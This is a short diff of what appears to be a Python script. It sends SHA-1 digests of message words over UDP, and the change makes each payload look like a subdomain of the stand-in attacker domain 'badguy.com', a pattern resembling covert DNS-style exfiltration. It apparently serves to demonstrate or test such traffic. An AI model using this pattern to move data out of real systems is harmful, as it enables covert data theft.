@@ -15,7 +15,7 @@ for word in SPLIT_MESSAGE:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     m = hashlib.sha1()
     m.update(word)
-    sock.sendto(m.hexdigest(), (UDP_IP, UDP_PORT))
+    sock.sendto(m.hexdigest()+".badguy.com", (UDP_IP, UDP_PORT))
     time.sleep(0.5)
 
 
